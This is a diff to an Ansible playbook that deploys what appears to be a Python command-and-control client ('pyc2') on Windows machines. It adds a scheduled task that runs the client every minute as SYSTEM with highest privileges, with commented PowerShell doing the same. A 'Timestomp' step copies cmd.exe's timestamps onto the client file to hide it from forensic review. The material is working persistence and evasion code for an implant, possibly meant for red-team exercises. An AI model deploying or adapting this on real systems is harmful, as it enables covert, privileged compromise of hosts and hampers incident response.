@@ -98,12 +98,53 @@
     }
   args:
     executable: powershell
+#- name: Start the service
+#  win_service:
+#    name: "{{ pyc2_service_name }}"
+#    state: started
+#    start_mode: auto
 
-- name: Start the service
-  win_service:
-    name: "{{ pyc2_service_name }}"
-    state: started
-    start_mode: auto
+- name: Schedule Python script execution
+  community.windows.win_scheduled_task:
+    name: RunPythonScript
+    description: Executes the Python script directly
+    actions:
+      - path: "C:\Program Files\Python311\\python.exe"
+        arguments: "{{ pyc2_client_location_win }}"
+        working_directory: C:\
+    triggers:
+      - type: daily
+        #start_boundary: '2025-04-11T00:00:00'
+        start_boundary: "{{ (ansible_date_time.iso8601 | to_datetime('%Y-%m-%dT%H:%M:%SZ') + 60) | to_datetime('%Y-%m-%dT%H:%M:%SZ') }}"
+        repetition:
+          interval: PT1M
+          #duration: P3D
+    username: SYSTEM
+    run_level: highest
+    multiple_instances: 2
+    state: present
+# Define the action to run the Python script
+#$Action = New-ScheduledTaskAction -Execute 'C:\Program Files\Python311\python.exe' -Argument 'C:\script.py'
+
+# Define the trigger to start the task one minute from now and repeat every minute indefinitely
+#$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+#$Trigger.RepetitionInterval = New-TimeSpan -Minutes 1
+#$Trigger.RepetitionDuration = [TimeSpan]::MaxValue
+
+# Define the task settings to prevent multiple instances
+#$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -StopIfGoingOnBatteries -DontStartNewIfRunning
+
+# Register the scheduled task to run under the SYSTEM account with highest privileges
+#Register-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings -TaskName 'RunPythonScript' -Description 'Executes the Python script directly' -User 'SYSTEM' -RunLevel Highest
+
+- name: Timestomp script to match cmd.exe
+  win_shell: |
+    $timestamp = (Get-Item 'C:\Windows\System32\cmd.exe').CreationTime
+    (Get-Item '{{ pyc2_client_location_win }}').CreationTime = $timestamp
+    (Get-Item '{{ pyc2_client_location_win }}').LastWriteTime = $timestamp
+    (Get-Item '{{ pyc2_client_location_win }}').LastAccessTime = $timestamp
+  args:
+    executable: powershell
 
 # Firewall handled in client script
 #- name: Allow inbound traffic on port through Windows firewall
@@ -125,12 +166,3 @@
 #    remoteport: "{{ pyc2_port }}"
 #    protocol: TCP
 #    action: allow
-
-- name: Timestomp script to match cmd.exe
-  win_shell: |
-    $timestamp = (Get-Item 'C:\Windows\System32\cmd.exe').CreationTime
-    (Get-Item '{{ pyc2_client_location_win }}').CreationTime = $timestamp
-    (Get-Item '{{ pyc2_client_location_win }}').LastWriteTime = $timestamp
-    (Get-Item '{{ pyc2_client_location_win }}').LastAccessTime = $timestamp
-  args:
-    executable: powershell
